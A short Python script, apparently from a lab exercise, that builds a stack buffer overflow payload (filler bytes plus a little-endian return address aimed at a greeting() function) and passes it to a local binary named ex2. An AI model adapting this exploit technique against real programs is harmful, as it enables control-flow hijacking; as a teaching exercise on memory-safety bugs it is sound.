#!/usr/bin/python3
# wrapper.py

import os

# Create buffer overflow payload
buff = 20 * (b'x')  # Fill buffer

# Target address of greeting() function
# Replace with actual address from objdump
addr = bytearray.fromhex("400646")  # Example address
addr.reverse()  # Convert to little-endian
buff += addr

print("exec ./ex2 with buff", buff)
os.execv('./ex2', ['./ex2', buff])